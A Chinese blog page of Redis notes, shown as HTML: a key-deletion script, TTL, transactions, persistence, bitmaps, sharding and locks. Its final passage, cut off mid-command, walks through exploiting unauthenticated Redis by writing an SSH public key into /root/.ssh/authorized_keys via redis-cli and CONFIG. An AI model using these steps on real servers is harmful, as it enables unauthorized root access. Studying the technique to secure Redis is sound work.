class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line"># 需要手动删除redis中某一天产生的key</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"># 执行 shell 命令</span><br><span class="line">def execCmd(cmd):</span><br><span class="line">	print cmd</span><br><span class="line">	<span class="keyword">return</span> commands.getstatusoutput(cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	args = sys.argv</span><br><span class="line">	<span class="keyword">if</span> len(args) != <span class="number">4</span>:</span><br><span class="line">		print <span class="string">'please input correct cmd argument, like python /home/hadoop/scripts/rediskey.py 2018-08-01 port passwd'</span></span><br><span class="line">		sys.exit(<span class="number">1</span>)</span><br><span class="line">	date = args[<span class="number">1</span>]</span><br><span class="line">	port = args[<span class="number">2</span>]</span><br><span class="line">	passwd = args[<span class="number">3</span>]</span><br><span class="line">	keyPath = <span class="string">'/home/hadoop/scripts/rediskey.txt'</span></span><br><span class="line">	cmd = <span class="string">'/app/local/redis-3.2.11/src/redis-cli -h 0.0.0.0 -p %s -a %s keys *%s* &gt; %s'</span>%(port, passwd, date, keyPath)</span><br><span class="line">	(status,result) = execCmd(cmd)</span><br><span class="line">	<span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">with</span> open(keyPath) <span class="keyword">as</span> f:</span><br><span class="line">			line = f.readline()</span><br><span class="line">			<span class="keyword">while</span> line:</span><br><span class="line">				key = line.strip()</span><br><span class="line">				cmd = <span class="string">'/app/local/redis-3.2.11/src/redis-cli -h 0.0.0.0 -p %s -a %s del %s'</span>%(port, passwd, key)</span><br><span class="line">				(status,result) = execCmd(cmd)</span><br><span class="line">				<span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">					print <span class="string">'del key %s success'</span>%(key)</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					print <span class="string">'del key %s failed...'</span>%(key)</span><br><span class="line">					print result</span><br><span class="line">				line = f.readline()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print result</span><br><span class="line">	print <span class="string">'redis %s key delete finished...'</span>%(date)</span><br><span class="line">调用这个脚本，只需要输入命令：python /home/hadoop/scripts/rediskey.py <span class="string">'2018-08-01'</span> <span class="number">6379</span> <span class="string">'123456'</span></span><br><span class="line">四个参数：</span><br><span class="line"> </span><br><span class="line">脚本名：/home/hadoop/scripts/rediskey.py</span><br><span class="line">要清理的日期：<span class="number">2018</span><span class="number">-08</span><span class="number">-01</span></span><br><span class="line">端口：<span class="number">6379</span></span><br><span class="line">host：<span class="number">123456</span></span><br><span class="line">基本思想就是模糊匹配redis的key，保存到一个文件，然后读取文件每一行，删除key即可。http:<span class="comment">//www.ikeguang.com/2018/08/28/delete-redis-key/</span></span><br></pre></td></tr></table></figure>
<h3 id="redis总结"><a href="#redis总结" class="headerlink" title="redis总结"></a>redis总结</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">redis中的键的生存时间</span><br><span class="line">expire  设置生存时间（单位/秒）</span><br><span class="line">expire key seconds(秒)</span><br><span class="line"></span><br><span class="line">ttl 查看键的剩余生存时间</span><br><span class="line">ttl key</span><br><span class="line"></span><br><span class="line">persist 取消生存时间</span><br><span class="line">persist key</span><br><span class="line"></span><br><span class="line">expireat指定时刻过期</span><br><span class="line">expireat key unix时间戳</span><br><span class="line">expireat key <span class="number">1551858600</span></span><br><span class="line">一组redis命令要么都执行，要么都不执行。</span><br><span class="line">原理：先将属于一个事务的命令发送给redis进行缓存，最后再让redis依次执行这些命令。</span><br><span class="line"></span><br><span class="line">应用场景：</span><br><span class="line">一组命令必须同时都执行，或者都不执行。</span><br><span class="line">我们想要保证一组命令在执行的过程之中不被其它命令插入。</span><br><span class="line">multi    <span class="comment">//事务开始</span></span><br><span class="line">.....</span><br><span class="line">exec     <span class="comment">//事务结束，开始执行事务中的命令</span></span><br><span class="line">discard     <span class="comment">//放弃事务</span></span><br><span class="line">正因为redis不支持回滚功能，才使得redis在事务上可以保持简洁和快速。</span><br><span class="line">redis持久化指把数据持久化到磁盘，便于故障恢复，redis支持两种方式的持久化，可以单独使用或者结合起来使用。</span><br><span class="line"></span><br><span class="line">第一种：RDB方式（redis默认的持久化方式）</span><br><span class="line">第二种：AOF方式</span><br><span class="line">edis持久化之RDB</span><br><span class="line"></span><br><span class="line">rdb方式的持久化是通过快照完成的，当符合一定条件时redis会自动将内存中的所有数据执行快照操作并存储到硬盘上。默认存储在dump.rdb文件中。(文件名在配置文件中dbfilename)</span><br><span class="line"></span><br><span class="line">redis进行快照的时机（在配置文件redis.conf中）</span><br><span class="line"></span><br><span class="line"> http:<span class="comment">//www.ikeguang.com/2018/12/12/redis-usage/</span></span><br><span class="line">save <span class="number">900</span> <span class="number">1</span>  <span class="comment">//表示900秒内至少一个键被更改则进行快照。</span></span><br><span class="line">save <span class="number">300</span> <span class="number">10</span>  <span class="comment">//表示300秒内10条被更改则快照</span></span><br><span class="line">save <span class="number">60</span> <span class="number">10000</span>  <span class="comment">//60秒内10000条</span></span><br><span class="line">Redis自动实现快照的过程</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、redis使用fork函数复制一份当前进程的副本(子进程)</span><br><span class="line"><span class="number">2</span>、父进程继续接收并处理客户端发来的命令，而子进程开始将内存中的数据写入硬盘中的临时文件</span><br><span class="line"><span class="number">3</span>、当子进程写入完所有数据后会用该临时文件替换旧的RDB文件，至此，一次快照操作完成。</span><br><span class="line">注意：快照时，要保证内存还有一半空间。</span><br><span class="line">rdb的优缺点</span><br><span class="line"></span><br><span class="line">优点：由于存储的有数据快照文件，恢复数据很方便。</span><br><span class="line">缺点：会丢失最后一次快照以后更改的所有数据。</span><br><span class="line"></span><br><span class="line">redis持久化之AOF</span><br><span class="line"></span><br><span class="line">把写操作指令，持续的写到一个类似日志文件里。</span><br><span class="line"></span><br><span class="line">由于写操作指令保存在日志文件里，异常恢复时把文件里面所有指令执行一遍即可。如果你执行了flushall命令，清空了redis，而你采用的aof持久化方式，那么，就可以找到这个文件，将最后一行flushall删掉，执行恢复命令，将命令全部执行一遍，这样数据就恢复了。</span><br><span class="line">AOF 的默认策略为每秒钟 fsync 一次，在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据（ fsync 会在后台线程执行，所以主线程可以继续努力地处理命令请求）。</span><br><span class="line"></span><br><span class="line">对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。</span><br><span class="line">Redis 的 bit 可以用于实现比 set 内存高度压缩的计数，它通过一个 bit <span class="number">1</span> 或 <span class="number">0</span> 来存储某个元素是否存在信息。例如网站唯一访客计数，可以把 user_id 作为 bit 的偏移量 offset，设置为 <span class="number">1</span> 表示有访问，使用 <span class="number">1</span> MB的空间就可以存放 <span class="number">800</span> 多万用户的一天访问计数情况。</span><br><span class="line">SETBIT key offset value  # 设置位信息 setbit users 123 1</span><br><span class="line">GETBIT key offset        # 获取位信息</span><br><span class="line">BITCOUNT key [start end] # 计数</span><br><span class="line">BITOP operation destkey key [key ...]  # 位图合并</span><br><span class="line">基于 bit 的方法比起 set 空间消耗小得多，但是它要求元素能否简单映射为位偏移，适用面窄了不少，另外它消耗的空间取决于最大偏移量，和计数值无关，如果最大偏移量很大，消耗内存也相当可观。</span><br><span class="line"></span><br><span class="line">数据在【从服务器】里【读】，在【主服务器】里【写】。</span><br><span class="line">数据库分为两类，一类是主数据库（master），另一类是从数据库[<span class="number">1</span>] （slave）。主数据库可以进行读写操作，当写操作导致数据变化时会自动将数据同步给从数据库。而从数据库一般是只读的，并接受主数据库同步过来的数据。一个主数据库可以拥有多个从数据库，而一个从数据库只能拥有一个主数据库。</span><br><span class="line">SETBIT video:<span class="number">1201</span> <span class="number">200</span> <span class="number">1</span></span><br><span class="line"># 上面的命令就是设置ID为200的用户，已经看过了ID为1201的视频。 </span><br><span class="line">GETBIT video:<span class="number">1201</span> <span class="number">200</span></span><br><span class="line"># 上面的命令就是查询ID为200的用户是否观看了ID为1201的视频</span><br><span class="line">https:<span class="comment">//www.zhihu.com/question/27672245</span></span><br><span class="line">&gt;set zhihu <span class="string">"www.zhihu.com"</span></span><br><span class="line">&gt;bitcount zhihu</span><br><span class="line"><span class="number">61</span></span><br><span class="line">$str = <span class="string">"www.zhihu.com"</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt;strlen($str);$i++) &#123;</span><br><span class="line">	$bin .= sprintf(<span class="string">"%08b"</span>, ord($str[$i]));</span><br><span class="line">&#125;</span><br><span class="line">echo ($bin); #01110111011101110111011100101110011110100110100001101001011010000111010100101110011000110110111101101101</span><br><span class="line">echo array_sum(str_split($bin, 1)); #61</span><br><span class="line"></span><br><span class="line"> &gt;set andy a</span><br><span class="line"> &gt;setbit andy <span class="number">6</span> <span class="number">1</span></span><br><span class="line"> &gt;setbit andy <span class="number">7</span> <span class="number">0</span></span><br><span class="line"> &gt;get andy </span><br><span class="line"> b</span><br><span class="line"> BITCOUNT 就是统计字符串的二级制码中，有多少个<span class="string">'1'</span>。 所以在这里，</span><br><span class="line"> </span><br><span class="line"> BITCOUNT andy 得到的结果就是 <span class="number">3</span> 啦。</span><br><span class="line"> </span><br><span class="line"><span class="string">'a'</span> 的ASCII码是  <span class="number">97</span>。转换为二进制是：<span class="number">01100001</span>。offset的学名叫做“偏移” 。二进制中的每一位就是offset值啦，比如在这里  offset <span class="number">0</span> 等于 ‘<span class="number">0</span>’ ，offset <span class="number">1</span>等于<span class="string">'1'</span> ,offset2等于<span class="string">'1'</span>,offset <span class="number">7</span> 等于<span class="string">'1'</span> ，没错，offset是从左往右计数的，也就是从高位往低位。我们通过SETBIT 命令将 andy中的 <span class="string">'a'</span> 变成 <span class="string">'b'</span> 应该怎么变呢？也就是将 <span class="number">01100001</span> 变成 <span class="number">01100010</span> （b的ASCII码是<span class="number">98</span>），这个很简单啦，也就是将<span class="string">'a'</span>中的offset <span class="number">6</span>从<span class="number">0</span>变成<span class="number">1</span>，将offset <span class="number">7</span> 从<span class="number">1</span>变成<span class="number">0</span> 。</span><br><span class="line"></span><br><span class="line"> bitcount key startOffset endOffset</span><br><span class="line"> </span><br><span class="line"> key：键值</span><br><span class="line"> </span><br><span class="line"> startOffset：起始偏移量（注意：这个偏移量是以字节为单位的）</span><br><span class="line"> </span><br><span class="line"> endOffset：结束偏移量（注意：这个偏移量同样是以字节为单位的）</span><br></pre></td></tr></table></figure>
<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> $dayKey = <span class="string">'login:'</span>.\date(<span class="string">'Ymd'</span>,\time());</span><br><span class="line">$redis-&gt;setbit($dayKey, $<span class="keyword">this</span>-&gt;user-&gt;id, <span class="number">1</span>);</span><br><span class="line">$redis-&gt;bitop(<span class="string">'AND'</span>, <span class="string">'threeAnd'</span>, <span class="string">'login:20190311'</span>, <span class="string">'login:20190312'</span>, <span class="string">'login:20190313'</span>);</span><br><span class="line">echo <span class="string">"连续三天都签到的用户数量："</span> . $redis-&gt;bitCount(<span class="string">'threeAnd'</span>);</span><br><span class="line"></span><br><span class="line">$redis-&gt;bitop(<span class="string">'OR'</span>, <span class="string">'threeOr'</span>, <span class="string">'login:20190311'</span>, <span class="string">'login:20190312'</span>, <span class="string">'login:20190313'</span>);</span><br><span class="line">echo <span class="string">"三天中签到用户数量（有一天签也算签了）："</span> . $redis-&gt;bitCount(<span class="string">'threeOr'</span>);</span><br><span class="line"></span><br><span class="line">$redis-&gt;bitop(<span class="string">'AND'</span>, <span class="string">'monthActivities'</span><span class="string">', $redis-&gt;keys('</span>login:<span class="number">201903</span>*<span class="string">'));</span></span><br><span class="line"><span class="string">echo "连续一个月签到用户数量：" . $redis-&gt;bitCount('</span>monthActivities<span class="string">');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo "当前用户指定天数是否签到：" . $redis-&gt;getbit('</span>login:<span class="number">20190311</span><span class="string">', $this-&gt;user-&gt;id);</span></span><br><span class="line"><span class="string">https://learnku.com/articles/25181</span></span><br><span class="line"><span class="string">$redis-&gt;scan(0, '</span>match<span class="string">', '</span>login:<span class="number">201903</span>*<span class="string">', '</span>count<span class="string">', 1000))</span></span><br><span class="line"><span class="string">COUNT 参数的默认值为 10 ，如果不是 0 ，你再使用 scan 3 match login:201903* 继续遍历。</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-分布式存储"><a href="#Redis-分布式存储" class="headerlink" title="Redis 分布式存储"></a>Redis 分布式存储</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisCluster</span> </span>&#123;</span><br><span class="line">    public $servers = array();</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">addServer</span>(<span class="params">$host, $port</span>) </span>&#123;</span><br><span class="line">        $redis = <span class="keyword">new</span> Redis();</span><br><span class="line">        $redis-&gt;_connected = <span class="literal">false</span>;</span><br><span class="line">        $redis-&gt;_host = $host;</span><br><span class="line">        $redis-&gt;_port = $port;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;servers[] = $redis;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!method_exists(<span class="string">"Redis"</span>, $method)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Execption(<span class="string">"not method"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $redis = $<span class="keyword">this</span>-&gt;servers[abs(crc32($args[<span class="number">0</span>])) % count($<span class="keyword">this</span>-&gt;servers)];</span><br><span class="line">        <span class="keyword">if</span> (!$redis-&gt;_connected) &#123;</span><br><span class="line">            $redis-&gt;connect($redis-&gt;_host, $redis-&gt;_port);</span><br><span class="line">            $redis-&gt;_connected = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// return $redis-&gt;$method(...$args); // PHP 5.6</span></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([$redis, $method], $args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$rc = <span class="keyword">new</span> RedisCluster();</span><br><span class="line">$rc-&gt;addServer(<span class="string">"127.0.0.1"</span>, <span class="number">8000</span>);</span><br><span class="line">$rc-&gt;addServer(<span class="string">"127.0.0.1"</span>, <span class="number">8001</span>);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32153</span></span><br><span class="line">$rc-&gt;set(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"b"</span>, <span class="number">2</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"c"</span>, <span class="number">3</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"d"</span>, <span class="number">4</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"e"</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
<h3 id="获取大-key"><a href="#获取大-key" class="headerlink" title="获取大 key"></a>获取大 key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">7001</span> –-bigkeys 也可以追加一个休眠参数，防止在查询过程 ops 暴增，使用此命令：redis-cli -h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">7001</span>–-bigkeys -i <span class="number">0.1</span></span><br><span class="line">https:<span class="comment">//github.com/leonchen83/redis-rdb-cli</span></span><br></pre></td></tr></table></figure>
<h3 id="redis锁"><a href="#redis锁" class="headerlink" title="redis锁"></a>redis锁</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果获取到锁，则执行 $callback 回调</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$callback = null</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result = $<span class="keyword">this</span>-&gt;acquire();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($result &amp;&amp; is_callable($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> tap($callback(), <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;release();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果获取到锁，则执行 $callback 回调</span></span><br><span class="line"><span class="comment">// 如果没有获取到锁，会等待250毫秒，继续去获取锁</span></span><br><span class="line"><span class="comment">// 如果在 $seconds 秒之内还没有获取到锁，会抛出 LockTimeoutException 异常</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params">$seconds, $callback = null</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $starting = $<span class="keyword">this</span>-&gt;currentTime();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (! $<span class="keyword">this</span>-&gt;acquire()) &#123;</span><br><span class="line">        usleep(<span class="number">250</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;currentTime() - $seconds &gt;= $starting) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> LockTimeoutException;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_callable($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> tap($callback(), <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;release();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisLock</span> <span class="keyword">extends</span> <span class="title">Lock</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The Redis factory implementation.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var \Illuminate\Redis\Connections\Connection</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $redis;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new lock instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param  \Illuminate\Redis\Connections\Connection  $redis</span></span><br><span class="line"><span class="comment">     * @param  string  $name</span></span><br><span class="line"><span class="comment">     * @param  int  $seconds</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$redis, $name, $seconds</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::__construct($name, $seconds);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis = $redis;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Attempt to acquire the lock.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">acquire</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = $<span class="keyword">this</span>-&gt;redis-&gt;setnx($<span class="keyword">this</span>-&gt;name, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result === <span class="number">1</span> &amp;&amp; $<span class="keyword">this</span>-&gt;seconds &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;redis-&gt;expire($<span class="keyword">this</span>-&gt;name, $<span class="keyword">this</span>-&gt;seconds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result === <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Release the lock.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">release</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;del($<span class="keyword">this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33111</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-未授权访问配合"><a href="#Redis-未授权访问配合" class="headerlink" title="Redis 未授权访问配合"></a>Redis 未授权访问配合</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">部分 Redis 绑定在 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。</span><br><span class="line">利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。</span><br><span class="line"></span><br><span class="line">Redis 暴露在公网（即绑定在<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。</span><br><span class="line">ssh-keygen –t rsa</span><br><span class="line">将公钥写入 foo.txt 文件</span><br><span class="line">$ (echo -e <span class="string">"\n\n"</span>; cat id_rsa.pub; echo -e <span class="string">"\n\n"</span>) &gt; foo.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ cat foo.txt | redis-cli -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span> -x set crackit</span><br><span class="line"> </span><br><span class="line">$ redis-cli -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span></span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; config set dir /root/.ssh/</span><br><span class="line"> </span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span 